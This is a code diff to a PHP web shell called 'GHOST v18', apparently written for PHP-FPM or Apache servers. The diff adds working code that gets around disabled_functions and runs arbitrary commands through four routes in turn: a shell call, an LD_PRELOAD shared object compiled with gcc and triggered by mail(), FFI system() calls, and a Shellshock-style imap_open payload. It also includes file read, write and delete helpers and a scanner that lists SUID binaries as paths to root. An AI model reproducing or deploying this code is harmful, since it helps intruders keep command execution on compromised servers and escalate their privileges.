@@ -2,7 +2,7 @@
 // language: PHP 7.4-8.3, file: gong.php, target: PHP-FPM/Apache mod_php
 // GHOST v18 - section 0, 1, 2, 3: bootstrap, UI, defense evasion, scanner.
 
-define('GH_VER',      '18.0.0-s3');
+define('GH_VER',      '18.0.0-s3-fix');
 define('GH_TAG',      'gong');
 define('GH_STATE_DIR', gh_state_dir());
 define('GH_STATE_FILE', GH_STATE_DIR . '/gh_state_' . md5(__FILE__) . '.json');
@@ -168,31 +168,51 @@ function gh_exec($cmd, $timeout = 10) {
 function gh_exec_adv($cmd, $timeout = 10) {
     if (!is_string($cmd) || $cmd === '') return array('out' => '', 'tier' => 'noop', 'err' => null);
     
+    // TIER 1: Basic exec (paling stabil)
     $r = gh_exec($cmd, $timeout); 
-    if (is_array($r) && isset($r['out']) && $r['out'] !== null) return $r;
+    if (is_array($r) && array_key_exists('out', $r) && $r['out'] !== null) {
+        return $r;
+    }
 
-    if (gh_can('putenv') && gh_can('mail')) {
+    // TIER 2: LD_PRELOAD (Cek fungsi dasar dulu sebelum eksekusi)
+    if (gh_can('putenv') && gh_can('mail') && gh_can('file_put_contents') && gh_can_exec()) {
         $tmp_dir = gh_tmpdir(); 
         if(!$tmp_dir) $tmp_dir = '/tmp';
         $so_file = $tmp_dir . '/gh_bypass_' . rand(1000,9999) . '.so'; 
         $cmd_file = $tmp_dir . '/gh_cmd_' . rand(1000,9999);
         $c_code = "#include <stdio.h>\n#include <unistd.h>\n__attribute__((constructor)) void init() {\n  unsetenv(\"LD_PRELOAD\");\n  FILE *f = fopen(\"" . $cmd_file . "\", \"r\"); if(f) { char buf[1024]; fgets(buf, 1024, f); system(buf); fclose(f); }\n}\n";
-        if (gh_write($tmp_dir . '/gh_c.c', $c_code)) {
+        
+        if (@file_put_contents($tmp_dir . '/gh_c.c', $c_code) !== false) {
             gh_exec('gcc -shared -fPIC -o ' . @escapeshellarg($so_file) . ' ' . @escapeshellarg($tmp_dir . '/gh_c.c'));
             if (@is_file($so_file)) {
-                gh_write($cmd_file, $cmd); @putenv("LD_PRELOAD=" . $so_file); @mail('a@b.c', 'x', 'x'); @putenv("LD_PRELOAD=");
+                @file_put_contents($cmd_file, $cmd); 
+                @putenv("LD_PRELOAD=" . $so_file); 
+                @mail('a@b.c', 'x', 'x'); 
+                @putenv("LD_PRELOAD=");
                 @unlink($so_file); @unlink($cmd_file); @unlink($tmp_dir . '/gh_c.c');
-                return array('out' => '(Executed via LD_PRELOAD)', 'tier' => 'ld_preload', 'err' => null);
+                return array('out' => '(Executed via LD_PRELOAD - output might be hidden)', 'tier' => 'ld_preload', 'err' => null);
             }
         }
     }
+
+    // TIER 3: FFI
     if (gh_can('ffi') && class_exists('FFI')) {
-        try { $ffi = FFI::cdef("int system(const char *command);"); @ob_start(); $ffi->system($cmd); $out = @ob_get_clean(); return array('out' => $out, 'tier' => 'ffi', 'err' => null); } catch (Throwable $e) {}
+        try { 
+            $ffi = FFI::cdef("int system(const char *command);"); 
+            @ob_start(); $ffi->system($cmd); $out = @ob_get_clean(); 
+            return array('out' => $out, 'tier' => 'ffi', 'err' => null); 
+        } catch (Throwable $e) {
+            // Ignore FFI error
+        }
     }
+
+    // TIER 4: imap_open
     if (gh_can('imap_open')) {
-        $payload = "() { :;}; /bin/sh -c " . @escapeshellarg($cmd); $res = @imap_open("{localhost:143/imap}INBOX", $payload, "");
+        $payload = "() { :;}; /bin/sh -c " . @escapeshellarg($cmd); 
+        $res = @imap_open("{localhost:143/imap}INBOX", $payload, "");
         if ($res) { @imap_close($res); return array('out' => '(Executed via imap_open)', 'tier' => 'imap', 'err' => null); }
     }
+
     return array('out' => null, 'tier' => null, 'err' => 'All exec bypass tiers failed');
 }
 
@@ -203,7 +223,7 @@ function gh_read($path, $max = 5242880) {
     if (gh_can('fopen') && gh_can('fread')) { $h = @fopen($path, 'rb'); if (is_resource($h)) { $d = ''; while (!@feof($h)) { $chunk = @fread($h, 8192); if ($chunk === false) break; $d .= $chunk; } @fclose($h); if (is_string($d)) return $d; } }
     if (gh_can('readfile')) { @ob_start(); @readfile($path); $d = @ob_get_clean(); if (is_string($d)) return $d; }
     if (gh_can('file')) { $lines = @file($path); if (is_array($lines)) return @implode('', $lines); }
-    $r = gh_exec_adv('cat ' . @escapeshellarg($path)); if (is_array($r) && isset($r['out']) && $r['out'] !== '') return $r['out'];
+    $r = gh_exec_adv('cat ' . @escapeshellarg($path)); if (is_array($r) && array_key_exists('out', $r) && $r['out'] !== '') return $r['out'];
     return null;
 }
 
@@ -213,13 +233,13 @@ function gh_write($path, $data, $append = false) {
     if (gh_can('file_put_contents')) { $n = @file_put_contents($path, $data, $flags); if ($n !== false) return true; }
     if (gh_can('fopen') && gh_can('fwrite')) { $h = @fopen($path, $append ? 'ab' : 'wb'); if (is_resource($h)) { $n = @fwrite($h, $data); @fclose($h); if ($n !== false) return true; } }
     $cmd = ($append ? 'printf %s ' . @escapeshellarg($data) . ' >> ' : 'printf %s ' . @escapeshellarg($data) . ' > ') . @escapeshellarg($path);
-    $r = gh_exec_adv($cmd); return (is_array($r) && isset($r['out']) && $r['tier'] !== null);
+    $r = gh_exec_adv($cmd); return (is_array($r) && array_key_exists('out', $r) && $r['tier'] !== null);
 }
 
 function gh_del($path) {
     if (!is_string($path) || $path === '') return false;
     if (gh_can('unlink')) { if (@unlink($path)) return true; }
-    $r = gh_exec_adv('rm -f ' . @escapeshellarg($path)); return (is_array($r) && isset($r['out']) && $r['tier'] !== null);
+    $r = gh_exec_adv('rm -f ' . @escapeshellarg($path)); return (is_array($r) && array_key_exists('out', $r) && $r['tier'] !== null);
 }
 
 // ==== SECTION 3: SCANNER & VULN DETECTOR ====================================
@@ -292,7 +312,7 @@ function gh_vuln_scan() {
         }
     }
     $sudo = gh_exec_adv("find /usr/bin /usr/local/bin -perm -4000 -type f 2>/dev/null | head -n 5");
-    if (trim($sudo['out']) && strpos($sudo['out'], '[-]') === false) {
+    if (isset($sudo['out']) && trim($sudo['out']) && strpos($sudo['out'], '[-]') === false) {
         foreach (explode("\n", trim($sudo['out'])) as $f) {
             if(trim($f)) $vulns[] = array('type'=>'SUID_BINARY', 'path'=>trim($f), 'desc'=>'File SUID. Bisa privesc ke root.');
         }
